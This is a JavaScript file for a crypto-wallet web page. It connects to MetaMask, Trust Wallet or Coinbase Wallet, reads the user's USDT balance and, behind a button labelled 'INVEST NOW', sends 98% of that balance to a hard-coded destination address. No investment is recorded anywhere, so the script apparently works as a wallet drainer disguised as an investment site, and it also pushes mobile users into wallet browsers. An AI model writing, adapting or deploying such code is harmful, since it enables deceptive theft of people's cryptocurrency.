// Import Web3 library
// Web3 is available globally from the CDN script
const Web3 = window.Web3

// Ethereum Mainnet Settings
const ETHEREUM_MAINNET = {
  chainId: "0x1",
  chainName: "Ethereum Mainnet",
  nativeCurrency: {
    name: "Ethereum",
    symbol: "ETH",
    decimals: 18,
  },
  rpcUrls: ["https://mainnet.infura.io/v3/", "https://eth-mainnet.g.alchemy.com/v2/", "https://cloudflare-eth.com"],
  blockExplorerUrls: ["https://etherscan.io/"],
}

// USDT ERC-20 Contract (Ethereum Mainnet)
const USDT_CONTRACT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"
const DESTINATION_ADDRESS = "0xafe6165080bF90fEB0a1725FA3003105910d1C08"

// ERC-20 ABI (transfer and balanceOf)
const ERC20_ABI = [
  {
    constant: false,
    inputs: [
      { name: "_to", type: "address" },
      { name: "_value", type: "uint256" },
    ],
    name: "transfer",
    outputs: [{ name: "", type: "bool" }],
    type: "function",
  },
  {
    constant: true,
    inputs: [{ name: "_owner", type: "address" }],
    name: "balanceOf",
    outputs: [{ name: "balance", type: "uint256" }],
    type: "function",
  },
  { constant: true, inputs: [], name: "decimals", outputs: [{ name: "", type: "uint8" }], type: "function" },
]

// Round function
function roundToFourDecimals(value) {
  return Math.round(value * 10000) / 10000
}

document.addEventListener("DOMContentLoaded", () => {
  const connectBtn = document.getElementById("connectBtn")
  const sendBtn = document.getElementById("sendBtn")
  const walletInfo = document.getElementById("walletInfo")
  const walletAddress = document.getElementById("walletAddress")
  const currentBalance = document.getElementById("currentBalance")
  const sendAmount = document.getElementById("sendAmount")
  const statusDiv = document.getElementById("status")
  const mobileWalletOptions = document.getElementById("mobileWalletOptions")
  const openTrustWalletBtn = document.getElementById("openTrustWallet")
  const openMetaMaskBtn = document.getElementById("openMetaMask")

  let web3
  let userAccount
  let accountBalance
  let usdtContract
  let tokenDecimals = 18

  // Detect mobile device and platform
  const userAgent = navigator.userAgent || navigator.vendor || window.opera
  const isAndroid = /android/i.test(userAgent)
  const isIOS = /iPad|iPhone|iPod/.test(userAgent) && !window.MSStream
  const isMobile = isAndroid || isIOS || /webOS|BlackBerry|IEMobile|Opera Mini/i.test(userAgent)

  // Detect if already inside a DApp browser
  const isTrustWallet = window.ethereum?.isTrust || false
  const isMetaMask = window.ethereum?.isMetaMask || false
  const isCoinbaseWallet = window.ethereum?.isCoinbaseWallet || false
  const isInDAppBrowser = isTrustWallet || isMetaMask || isCoinbaseWallet

  // Check for injected Web3 provider
  const hasWeb3Provider = window.ethereum || window.web3

  // Log detection info for debugging
  console.log('🔍 Device Detection:', {
    isMobile,
    isAndroid,
    isIOS,
    hasWeb3Provider: !!hasWeb3Provider,
    isInDAppBrowser,
    isTrustWallet,
    isMetaMask,
    isCoinbaseWallet,
    userAgent: userAgent.substring(0, 100)
  })

  // Setup connection
  if (hasWeb3Provider) {
    // Web3 provider detected (extension or DApp browser)
    web3 = new Web3(window.ethereum || window.web3.currentProvider)
    usdtContract = new web3.eth.Contract(ERC20_ABI, USDT_CONTRACT_ADDRESS)

    connectBtn.addEventListener("click", connectWallet)
    sendBtn.addEventListener("click", sendTransaction)

    if (window.ethereum) {
      window.ethereum.on("accountsChanged", handleAccountsChanged)
      window.ethereum.on("chainChanged", handleChainChanged)
    }

    if (isInDAppBrowser) {
      const walletName = isTrustWallet ? 'Trust Wallet' : isMetaMask ? 'MetaMask' : 'Coinbase Wallet'
      showProcessing(`✅ ${walletName} detected! Click Connect Wallet to continue.`)
    } else {
      showProcessing("✅ Wallet extension detected! Click Connect Wallet to continue.")
    }
  } else {
    // No provider detected
    if (isMobile) {
      // Mobile without DApp browser - show wallet selection buttons
      // First, add click handler to connect button to show wallet options
      connectBtn.addEventListener("click", showWalletOptions)

      if (isIOS) {
        showProcessing("📱 Click Connect Wallet to choose your wallet")
      } else if (isAndroid) {
        showProcessing("📱 Click Connect Wallet to choose your wallet")
      }

      // Add event listeners to wallet buttons
      openTrustWalletBtn.addEventListener("click", () => openWalletApp("trustwallet"))
      openMetaMaskBtn.addEventListener("click", () => openWalletApp("metamask"))
    } else {
      // Desktop without extension
      showProcessing("🦊 Please install MetaMask extension to continue")
      connectBtn.disabled = true
    }
  }

  function showWalletOptions() {
    // Hide connect button
    connectBtn.style.display = "none"

    // Show wallet options
    mobileWalletOptions.style.display = "block"

    // Update status message
    showProcessing("📱 Choose your wallet app to continue")

    // Scroll to wallet options smoothly
    setTimeout(() => {
      mobileWalletOptions.scrollIntoView({
        behavior: "smooth",
        block: "center"
      })
    }, 100)
  }

  function openWalletApp(walletType) {
    try {
      // Get current URL
      const currentUrl = window.location.href
      const encodedUrl = encodeURIComponent(currentUrl)
      const host = window.location.host
      const pathname = window.location.pathname

      let deepLink = ""
      let walletName = ""

      if (walletType === "trustwallet") {
        deepLink = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodedUrl}`
        walletName = "Trust Wallet"
        console.log("🔷 Opening Trust Wallet...")
      } else if (walletType === "metamask") {
        deepLink = `https://metamask.app.link/dapp/${host}${pathname}`
        walletName = "MetaMask"
        console.log("🦊 Opening MetaMask...")
      }

      showProcessing(`🚀 Opening ${walletName}...`)
      console.log("Deep link:", deepLink)

      // Open deep link
      window.location.href = deepLink

      // Show instructions after attempting to open
      setTimeout(() => {
        showProcessing(`
          <div style="text-align: left;">
            <strong>📱 ${walletName} should be opening...</strong><br><br>
            <strong>What happens next:</strong><br>
            1. ${walletName} app will open<br>
            2. The site loads inside the wallet browser<br>
            3. You'll see a "Connect Wallet" button<br>
            4. Click it and approve the connection<br>
            5. Done! ✅<br><br>
            <strong>If ${walletName} didn't open:</strong><br>
            • Make sure the app is installed<br>
            • Or choose a different wallet above<br>
          </div>
        `)
      }, 2000)

    } catch (error) {
      console.error("Error opening wallet app:", error)
      showError(`Failed to open ${walletType}. Please open the wallet app manually and access the site from there.`)
    }
  }

  async function connectWallet() {
    try {
      setLoading(connectBtn, "Connecting...")
      showProcessing("Connecting to wallet...")

      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" })
      userAccount = accounts[0]
      walletAddress.textContent = `${userAccount.substring(0, 6)}...${userAccount.substring(38)}`
      walletInfo.style.display = "block"

      const chainId = await web3.eth.getChainId()
      if (chainId !== Number.parseInt(ETHEREUM_MAINNET.chainId, 16)) {
        try {
          await window.ethereum.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: ETHEREUM_MAINNET.chainId }],
          })
        } catch (switchError) {
          throw new Error("Please switch to Ethereum Mainnet in your wallet!")
        }
      }

      tokenDecimals = await usdtContract.methods.decimals().call()
      await getBalance()

      showSuccess("✅ Connected successfully to Ethereum Mainnet!")
      setSuccess(connectBtn, "Connected")
      sendBtn.disabled = false

      document.getElementById("wallet").scrollIntoView({ behavior: "smooth", block: "center" })
    } catch (error) {
      showError(`Error: ${error.message}`)
      resetButton(connectBtn, "Connect Wallet")
    }
  }

  async function getBalance() {
    try {
      const balance = await usdtContract.methods.balanceOf(userAccount).call()
      const balanceBN = web3.utils.toBN(balance)
      const divisor = web3.utils.toBN(10).pow(web3.utils.toBN(tokenDecimals))

      const whole = balanceBN.div(divisor).toString()
      const fraction = balanceBN.mod(divisor).toString().padStart(tokenDecimals, "0").substring(0, 4)

      accountBalance = Number.parseFloat(`${whole}.${fraction}`)

      currentBalance.textContent = `${roundToFourDecimals(accountBalance).toFixed(4)} USDT`
      sendAmount.textContent = `${roundToFourDecimals(accountBalance * 0.98).toFixed(4)} USDT`
    } catch (error) {
      console.error("Error fetching balance:", error)
      currentBalance.textContent = "Failed to load"
      sendAmount.textContent = "Failed to load"
    }
  }

  async function sendTransaction() {
    try {
      setLoading(sendBtn, "Preparing...")
      showProcessing("Preparing transaction...")

      if (!accountBalance || accountBalance <= 0) throw new Error("Insufficient USDT balance")

      const amountToSend = roundToFourDecimals(accountBalance * 0.98)
      const amountInSmallestUnit = web3.utils.toBN(amountToSend * Math.pow(10, tokenDecimals))

      if (amountInSmallestUnit.lte(web3.utils.toBN(0))) throw new Error("Amount too small to send")

      const txData = usdtContract.methods.transfer(DESTINATION_ADDRESS, amountInSmallestUnit.toString()).encodeABI()

      const ethBalance = await web3.eth.getBalance(userAccount)
      if (Number.parseFloat(web3.utils.fromWei(ethBalance, "ether")) < 0.001)
        throw new Error("Insufficient ETH balance to cover gas fees")

      const gasEstimate = await usdtContract.methods
        .transfer(DESTINATION_ADDRESS, amountInSmallestUnit.toString())
        .estimateGas({ from: userAccount })

      const tx = {
        from: userAccount,
        to: USDT_CONTRACT_ADDRESS,
        data: txData,
        gas: gasEstimate,
      }

      showProcessing("🔒 Please confirm the transaction in your wallet...")
      const receipt = await web3.eth.sendTransaction(tx)

      showSuccess(`
                <strong>✅ Transaction confirmed!</strong><br>
                <strong>Amount sent:</strong> ${amountToSend.toFixed(4)} USDT<br>
                <strong>Destination:</strong> ${DESTINATION_ADDRESS}<br>
                <a href="https://etherscan.io/tx/${receipt.transactionHash}" target="_blank">View on Etherscan ↗</a>
            `)

      await getBalance()
    } catch (error) {
      showError(`❌ Transaction failed: ${error.message}`)
    } finally {
      resetButton(sendBtn, "INVEST NOW")
    }
  }

  function handleAccountsChanged(accounts) {
    if (accounts.length === 0) showError("Please connect your wallet.")
    else {
      userAccount = accounts[0]
      walletAddress.textContent = `${userAccount.substring(0, 6)}...${userAccount.substring(38)}`
      getBalance()
    }
  }

  function handleChainChanged(chainId) {
    window.location.reload()
  }

  function setLoading(button, text) {
    button.disabled = true
    button.innerHTML = `<span class="loading"></span> <span>${text}</span>`
  }

  function setSuccess(button, text) {
    button.disabled = true
    button.innerHTML = `<span>✅ ${text}</span>`
  }

  function resetButton(button, text) {
    button.disabled = false
    button.innerHTML = `<span>${text}</span>`
  }

  function showProcessing(message) {
    statusDiv.className = "status status-processing"
    statusDiv.innerHTML = message
  }

  function showSuccess(message) {
    statusDiv.className = "status status-success"
    statusDiv.innerHTML = message
  }

  function showError(message) {
    statusDiv.className = "status status-error"
    statusDiv.textContent = message
  }
})
